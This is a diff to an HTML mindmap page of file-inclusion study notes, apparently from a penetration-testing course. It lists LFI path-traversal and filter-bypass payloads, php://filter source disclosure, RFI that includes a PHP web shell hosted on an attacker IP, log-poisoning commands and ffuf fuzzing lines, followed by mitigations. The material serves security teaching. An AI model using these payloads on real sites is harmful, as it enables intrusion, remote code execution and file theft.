@@ -4,94 +4,39 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>File Inclusion — Mindmap</title>
+<link rel="stylesheet" href="../../../vendor/markmap/markmap-toolbar.css" />
 <style>
   :root { color-scheme: light dark; }
   html, body { margin: 0; height: 100%; }
   body { background: #faf8f8; }
   @media (prefers-color-scheme: dark) { body { background: #1e1e21; } }
-  svg.markmap { width: 100%; height: 100vh; display: block; }
+  #mindmap { width: 100%; height: 100vh; display: block; }
+  .mm-toolbar { position: absolute; bottom: 0.75rem; right: 0.75rem; }
 </style>
-<script>
-  window.markmap = {
-    autoLoader: {
-      toolbar: true,
-      options: { maxWidth: 320, spacingVertical: 8, paddingX: 16 },
-    },
-  }
-</script>
-<script async src="https://cdn.jsdelivr.net/npm/markmap-autoloader@0.18.12"></script>
+<script src="../../../vendor/markmap/d3.min.js"></script>
+<script src="../../../vendor/markmap/markmap-view.js"></script>
+<script src="../../../vendor/markmap/markmap-toolbar.js"></script>
 </head>
 <body>
-  <div class="markmap">
-    <script type="text/template">
-# File Inclusion
-## 🎯 Main Idea
-- File Inclusion flaws occur when user input controls which file a web app loads (e.g. `?language=`), without proper sanitization.
-- Goal: read sensitive local files (LFI), disclose source code, and escalate to remote code execution via RFI, PHP wrappers, and log poisoning.
-- (Note: this module has no `00 - Cheatsheet.md`; payloads below are extracted from the lesson files.)
-
-## 💥 Attack / Exploit Vectors
-### Local File Inclusion (LFI) & Path Traversal
-- Include local files via relative/absolute paths; traverse out of the web root.
-- **Commands**
-  - `/index.php?page=../../../../etc/passwd` — read a Linux local file via path traversal
-  - `../../../../windows/boot.ini` / `C:\Windows\boot.ini` — Windows equivalent
-  - `?language=/etc/passwd` — absolute path inclusion
-  - Second-order: inject traversal into stored data (e.g. `/profile/$username/avatar.png`) so it's included elsewhere
-### Basic Bypasses (filters / appended extension)
-- Defeat naive filters, non-recursive stripping, approved-path checks, and appended `.php`.
-- **Commands**
-  - `....//....//etc/passwd` — bypass non-recursive `../` removal (becomes `../` after one strip)
-  - `%2e%2e%2f` — URL-encoded `../` to bypass filters (double-encode if needed)
-  - `./languages/../../../../etc/passwd` — start with an approved path to pass validation
-  - `/etc/passwd%00` — null-byte to drop appended extension (PHP < 5.3/5.4 only)
-  - `/etc/passwd/.` — trailing `/.` to bypass appended `.php` in some configs
-### PHP Filters — Source Code Disclosure
-- Use `php://filter` with base64 to read PHP source instead of executing it.
-- **Commands**
-  - `php://filter/read=convert.base64-encode/resource=config` — base64-encode and disclose `config.php` source
-  - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` — fuzz for PHP pages to read
-  - `echo 'PD9waHAK...' | base64 -d` — decode the disclosed source
-### Remote File Inclusion (RFI) — RCE
-- Include a remote URL hosting a malicious PHP shell (requires `allow_url_include`).
-- **Commands**
-  - `?language=http://127.0.0.1:80/index.php` — verify RFI by first including a local URL (also SSRF)
-  - `echo '<?php system($_GET["cmd"]); ?>' > shell.php` — create a malicious web shell
-  - `sudo python3 -m http.server <LISTENING_PORT>` — host the shell over HTTP
-  - `?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` — include remote shell and run a command
-  - `sudo python -m pyftpdlib -p 21` + `?language=ftp://<OUR_IP>/shell.php&cmd=id` — host/include via FTP
-  - `impacket-smbserver -smb2support share $(pwd)` + `?language=\\<OUR_IP>\share\shell.php&cmd=whoami` — SMB (Windows, no `allow_url_include` needed)
-### Log Poisoning — RCE
-- Write PHP code into a controllable, readable log/session file, then include it to execute.
-- **Commands**
-  - `?language=/var/lib/php/sessions/sess_<PHPSESSID>` — include a PHP session file (PHP Session Poisoning)
-  - `?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` — poison the session via `page` value, then include `&cmd=id`
-  - `?language=/var/log/apache2/access.log` — include the Apache access log
-  - `echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison` + `curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison` — poison log via User-Agent header
-  - `/proc/self/environ`, `/proc/self/fd/N` — alternative poisonable files if logs unreadable
-  - Other logs: `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log`
-### Automated Scanning / Fuzzing
-- Fuzz for vulnerable parameters, LFI payloads, webroot, logs, and config files.
-- **Commands**
-  - `ffuf -w .../burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` — fuzz for exposed parameters
-  - `ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` — fuzz LFI payloads
-  - `ffuf -w .../default-web-root-directory-linux.txt:FUZZ -u '...?language=../../../../FUZZ/index.php' -fs 2287` — find server webroot
-  - `ffuf -w ./LFI-WordList-Linux:FUZZ -u '...?language=../../../../FUZZ' -fs 2287` — fuzz for logs/config files
-
-## 🛠️ Key Tools & Concepts
-- Vulnerable functions — `include()`/`include_once()`, `require()`, `file_get_contents()`, `fopen()`, `readfile()` (PHP); `import` (Java); `@Html.Partial()`/`RemotePartial()`, `include` (.NET); `res.render()`, `fs.readFile()` (NodeJS)
-- Read vs Execute — some functions only read a file's content, others execute included PHP
-- `php://filter` wrapper — stream filters (base64) for source disclosure
-- `allow_url_include` — PHP setting that must be On for RFI over http/ftp
-- ffuf / seclists — fuzzing tool and LFI wordlists (LFI-Jhaddix.txt)
-- LFI tools — LFISuite, LFiFreak, liffy (mostly outdated, python2)
-
-## 🛡️ Mitigations
-- Avoid passing user input to file-inclusion functions; use a whitelist/allow-list of permitted files
-- Prevent directory traversal (strip/validate `../`, use `basename()`, verify final resolved path)
-- Harden web server config: disable `allow_url_include`/`allow_url_fopen`, restrict file permissions
-- Deploy a Web Application Firewall (WAF) as defense in depth
-    </script>
-  </div>
+  <svg id="mindmap"></svg>
+  <script>
+    const data = {"content":"File Inclusion","children":[{"content":"&#x1f3af; Main Idea","children":[{"content":"File Inclusion flaws occur when user input controls which file a web app loads (e.g. <code>?language=<\/code>), without proper sanitization.","children":[],"payload":{"tag":"li","lines":"2,3"}},{"content":"Goal: read sensitive local files (LFI), disclose source code, and escalate to remote code execution via RFI, PHP wrappers, and log poisoning.","children":[],"payload":{"tag":"li","lines":"3,4"}},{"content":"(Note: this module has no <code>00 - Cheatsheet.md<\/code>; payloads below are extracted from the lesson files.)","children":[],"payload":{"tag":"li","lines":"4,6"}}],"payload":{"tag":"h2","lines":"1,2"}},{"content":"&#x1f4a5; Attack / Exploit Vectors","children":[{"content":"Local File Inclusion (LFI) &amp; Path Traversal","children":[{"content":"Include local files via relative/absolute paths; traverse out of the web root.","children":[],"payload":{"tag":"li","lines":"8,9"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>/index.php?page=../../../../etc/passwd<\/code> &#x2014; read a Linux local file via path traversal","children":[],"payload":{"tag":"li","lines":"10,11"}},{"content":"<code>../../../../windows/boot.ini<\/code> / <code>C:\\Windows\\boot.ini<\/code> &#x2014; Windows equivalent","children":[],"payload":{"tag":"li","lines":"11,12"}},{"content":"<code>?language=/etc/passwd<\/code> &#x2014; absolute path inclusion","children":[],"payload":{"tag":"li","lines":"12,13"}},{"content":"Second-order: inject traversal into stored data (e.g. <code>/profile/&#x24;username/avatar.png<\/code>) so it&apos;s included elsewhere","children":[],"payload":{"tag":"li","lines":"13,14"}}],"payload":{"tag":"li","lines":"9,14"}}],"payload":{"tag":"h3","lines":"7,8"}},{"content":"Basic Bypasses (filters / appended extension)","children":[{"content":"Defeat naive filters, non-recursive stripping, approved-path checks, and appended <code>.php<\/code>.","children":[],"payload":{"tag":"li","lines":"15,16"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>....//....//etc/passwd<\/code> &#x2014; bypass non-recursive <code>../<\/code> removal (becomes <code>../<\/code> after one strip)","children":[],"payload":{"tag":"li","lines":"17,18"}},{"content":"<code>%2e%2e%2f<\/code> &#x2014; URL-encoded <code>../<\/code> to bypass filters (double-encode if needed)","children":[],"payload":{"tag":"li","lines":"18,19"}},{"content":"<code>./languages/../../../../etc/passwd<\/code> &#x2014; start with an approved path to pass validation","children":[],"payload":{"tag":"li","lines":"19,20"}},{"content":"<code>/etc/passwd%00<\/code> &#x2014; null-byte to drop appended extension (PHP &lt; 5.3/5.4 only)","children":[],"payload":{"tag":"li","lines":"20,21"}},{"content":"<code>/etc/passwd/.<\/code> &#x2014; trailing <code>/.<\/code> to bypass appended <code>.php<\/code> in some configs","children":[],"payload":{"tag":"li","lines":"21,22"}}],"payload":{"tag":"li","lines":"16,22"}}],"payload":{"tag":"h3","lines":"14,15"}},{"content":"PHP Filters &#x2014; Source Code Disclosure","children":[{"content":"Use <code>php://filter<\/code> with base64 to read PHP source instead of executing it.","children":[],"payload":{"tag":"li","lines":"23,24"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>php://filter/read=convert.base64-encode/resource=config<\/code> &#x2014; base64-encode and disclose <code>config.php<\/code> source","children":[],"payload":{"tag":"li","lines":"25,26"}},{"content":"<code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php<\/code> &#x2014; fuzz for PHP pages to read","children":[],"payload":{"tag":"li","lines":"26,27"}},{"content":"<code>echo &apos;PD9waHAK...&apos; | base64 -d<\/code> &#x2014; decode the disclosed source","children":[],"payload":{"tag":"li","lines":"27,28"}}],"payload":{"tag":"li","lines":"24,28"}}],"payload":{"tag":"h3","lines":"22,23"}},{"content":"Remote File Inclusion (RFI) &#x2014; RCE","children":[{"content":"Include a remote URL hosting a malicious PHP shell (requires <code>allow_url_include<\/code>).","children":[],"payload":{"tag":"li","lines":"29,30"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>?language=http://127.0.0.1:80/index.php<\/code> &#x2014; verify RFI by first including a local URL (also SSRF)","children":[],"payload":{"tag":"li","lines":"31,32"}},{"content":"<code>echo &apos;&lt;?php system(&#x24;_GET[&quot;cmd&quot;]); ?&gt;&apos; &gt; shell.php<\/code> &#x2014; create a malicious web shell","children":[],"payload":{"tag":"li","lines":"32,33"}},{"content":"<code>sudo python3 -m http.server &lt;LISTENING_PORT&gt;<\/code> &#x2014; host the shell over HTTP","children":[],"payload":{"tag":"li","lines":"33,34"}},{"content":"<code>?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id<\/code> &#x2014; include remote shell and run a command","children":[],"payload":{"tag":"li","lines":"34,35"}},{"content":"<code>sudo python -m pyftpdlib -p 21<\/code> + <code>?language=ftp://&lt;OUR_IP&gt;/shell.php&amp;cmd=id<\/code> &#x2014; host/include via FTP","children":[],"payload":{"tag":"li","lines":"35,36"}},{"content":"<code>impacket-smbserver -smb2support share &#x24;(pwd)<\/code> + <code>?language=\\\\&lt;OUR_IP&gt;\\share\\shell.php&amp;cmd=whoami<\/code> &#x2014; SMB (Windows, no <code>allow_url_include<\/code> needed)","children":[],"payload":{"tag":"li","lines":"36,37"}}],"payload":{"tag":"li","lines":"30,37"}}],"payload":{"tag":"h3","lines":"28,29"}},{"content":"Log Poisoning &#x2014; RCE","children":[{"content":"Write PHP code into a controllable, readable log/session file, then include it to execute.","children":[],"payload":{"tag":"li","lines":"38,39"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>?language=/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;<\/code> &#x2014; include a PHP session file (PHP Session Poisoning)","children":[],"payload":{"tag":"li","lines":"40,41"}},{"content":"<code>?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E<\/code> &#x2014; poison the session via <code>page<\/code> value, then include <code>&amp;cmd=id<\/code>","children":[],"payload":{"tag":"li","lines":"41,42"}},{"content":"<code>?language=/var/log/apache2/access.log<\/code> &#x2014; include the Apache access log","children":[],"payload":{"tag":"li","lines":"42,43"}},{"content":"<code>echo -n &quot;User-Agent: &lt;?php system(\\&#x24;_GET[&apos;cmd&apos;]); ?&gt;&quot; &gt; Poison<\/code> + <code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -H @Poison<\/code> &#x2014; poison log via User-Agent header","children":[],"payload":{"tag":"li","lines":"43,44"}},{"content":"<code>/proc/self/environ<\/code>, <code>/proc/self/fd/N<\/code> &#x2014; alternative poisonable files if logs unreadable","children":[],"payload":{"tag":"li","lines":"44,45"}},{"content":"Other logs: <code>/var/log/sshd.log<\/code>, <code>/var/log/mail<\/code>, <code>/var/log/vsftpd.log<\/code>","children":[],"payload":{"tag":"li","lines":"45,46"}}],"payload":{"tag":"li","lines":"39,46"}}],"payload":{"tag":"h3","lines":"37,38"}},{"content":"Automated Scanning / Fuzzing","children":[{"content":"Fuzz for vulnerable parameters, LFI payloads, webroot, logs, and config files.","children":[],"payload":{"tag":"li","lines":"47,48"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>ffuf -w .../burp-parameter-names.txt:FUZZ -u &apos;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&apos; -fs 2287<\/code> &#x2014; fuzz for exposed parameters","children":[],"payload":{"tag":"li","lines":"49,50"}},{"content":"<code>ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &apos;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&apos; -fs 2287<\/code> &#x2014; fuzz LFI payloads","children":[],"payload":{"tag":"li","lines":"50,51"}},{"content":"<code>ffuf -w .../default-web-root-directory-linux.txt:FUZZ -u &apos;...?language=../../../../FUZZ/index.php&apos; -fs 2287<\/code> &#x2014; find server webroot","children":[],"payload":{"tag":"li","lines":"51,52"}},{"content":"<code>ffuf -w ./LFI-WordList-Linux:FUZZ -u &apos;...?language=../../../../FUZZ&apos; -fs 2287<\/code> &#x2014; fuzz for logs/config files","children":[],"payload":{"tag":"li","lines":"52,54"}}],"payload":{"tag":"li","lines":"48,54"}}],"payload":{"tag":"h3","lines":"46,47"}}],"payload":{"tag":"h2","lines":"6,7"}},{"content":"&#x1f6e0;&#xfe0f; Key Tools &amp; Concepts","children":[{"content":"Vulnerable functions &#x2014; <code>include()<\/code>/<code>include_once()<\/code>, <code>require()<\/code>, <code>file_get_contents()<\/code>, <code>fopen()<\/code>, <code>readfile()<\/code> (PHP); <code>import<\/code> (Java); <code>@Html.Partial()<\/code>/<code>RemotePartial()<\/code>, <code>include<\/code> (.NET); <code>res.render()<\/code>, <code>fs.readFile()<\/code> (NodeJS)","children":[],"payload":{"tag":"li","lines":"55,56"}},{"content":"Read vs Execute &#x2014; some functions only read a file&apos;s content, others execute included PHP","children":[],"payload":{"tag":"li","lines":"56,57"}},{"content":"<code>php://filter<\/code> wrapper &#x2014; stream filters (base64) for source disclosure","children":[],"payload":{"tag":"li","lines":"57,58"}},{"content":"<code>allow_url_include<\/code> &#x2014; PHP setting that must be On for RFI over http/ftp","children":[],"payload":{"tag":"li","lines":"58,59"}},{"content":"ffuf / seclists &#x2014; fuzzing tool and LFI wordlists (LFI-Jhaddix.txt)","children":[],"payload":{"tag":"li","lines":"59,60"}},{"content":"LFI tools &#x2014; LFISuite, LFiFreak, liffy (mostly outdated, python2)","children":[],"payload":{"tag":"li","lines":"60,62"}}],"payload":{"tag":"h2","lines":"54,55"}},{"content":"&#x1f6e1;&#xfe0f; Mitigations","children":[{"content":"Avoid passing user input to file-inclusion functions; use a whitelist/allow-list of permitted files","children":[],"payload":{"tag":"li","lines":"63,64"}},{"content":"Prevent directory traversal (strip/validate <code>../<\/code>, use <code>basename()<\/code>, verify final resolved path)","children":[],"payload":{"tag":"li","lines":"64,65"}},{"content":"Harden web server config: disable <code>allow_url_include<\/code>/<code>allow_url_fopen<\/code>, restrict file permissions","children":[],"payload":{"tag":"li","lines":"65,66"}},{"content":"Deploy a Web Application Firewall (WAF) as defense in depth","children":[],"payload":{"tag":"li","lines":"66,67"}}],"payload":{"tag":"h2","lines":"62,63"}}],"payload":{"tag":"h1","lines":"0,1"}}
+    const { Markmap, Toolbar, globalCSS } = window.markmap
+    if (globalCSS) {
+      const s = document.createElement("style")
+      s.textContent = globalCSS
+      document.head.appendChild(s)
+    }
+    const mm = Markmap.create(
+      "#mindmap",
+      { maxWidth: 320, spacingVertical: 8, paddingX: 16 },
+      data,
+    )
+    try {
+      const { el } = Toolbar.create(mm)
+      el.classList.add("mm-toolbar")
+      document.body.appendChild(el)
+    } catch (e) {}
+  </script>
 </body>
 </html>
